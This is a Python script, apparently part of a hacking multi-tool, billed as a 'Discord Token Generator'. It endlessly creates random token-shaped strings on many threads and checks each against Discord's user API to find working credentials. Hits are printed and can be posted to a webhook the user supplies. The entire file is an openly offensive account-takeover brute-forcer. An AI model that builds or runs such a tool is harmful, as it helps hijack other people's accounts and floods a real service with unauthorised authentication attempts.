from Config.Util import *
from Config.Config import *
from Config.Translates import *

current_language = LANGUAGE

def tr(key):
    return translations[current_language].get(key, key)

try:
    import string
    import requests
    import json
    import random
    import threading
except Exception as e:
   ErrorModule(e)
   
Title("Discord Token Generator")

try:
    webhook = input(f"{color.BLUE}\n{INPUT} {tr('WebhookYN')} -> {color.RESET}")
    if webhook in ['y', 'Y', 'Yes', 'yes', 'YES', 'o', 'O', 'Oui', 'oui', 'OUI']:
        webhook_url = input(f"{color.BLUE}{INPUT} {tr('URLWebhook')} -> {color.RESET}")
        CheckWebhook(webhook_url)

    try:
        threads_number = int(input(f"{INPUT} {tr('ThreadsNumber')} -> {color.RESET}"))
    except:
        ErrorNumber()

    def send_webhook(embed_content):
        payload = {
        'embeds': [embed_content],
        'username': username_webhook,
        'avatar_url': avatar_webhook
        }

        headers = {
        'Content-Type': 'application/json'
        }

        requests.post(webhook_url, data=json.dumps(payload), headers=headers)

    def token_check():
        first = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([24, 26])))
        second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
        third =  ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
        token = f"{first}.{second}.{third}"

        try:
            try:
                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
                user['username']
                if webhook in ['y']:
                    embed_content = {
                    'title': f'Token Valid !',
                    'description': f"**__Token:__**\n```{token}```",
                    'color': color_webhook,
                    'footer': {
                    "text": username_webhook,
                    "icon_url": avatar_webhook,
                    }
                    }
                    send_webhook(embed_content)
                    print(f"{valid}[{secondary}{current_time_hour()}{valid}] {GEN_VALID} Status:  {color.WHITE}Valid{color.GREEN}  | Token: {secondary}{token}{color.GREEN}")
                else:
                    print(f"{valid}[{secondary}{current_time_hour()}{valid}] {GEN_VALID} Status:  {color.WHITE}Valid{color.GREEN}  | Token: {secondary}{token}{color.GREEN}")
            except:
                print(f"{invalid}[{secondary}{current_time_hour()}{primary}] {GEN_INVALID} Status: {color.WHITE}Invalid{primary} | Token: {secondary}{token}{color.BLUE}")
        except:
            print(f"{invalid}[{secondary}{current_time_hour()}{primary}] {GEN_INVALID} Status: {color.WHITE}{tr('Error')}{primary} | Token: {secondary}{token}{color.BLUE}")

    def request():
        threads = []
        try:
            for _ in range(int(threads_number)):
                t = threading.Thread(target=token_check)
                t.start()
                threads.append(t)
        except:
            ErrorNumber()

        for thread in threads:
            thread.join()

    while True:
        request()
except Exception as e:
    Error(e)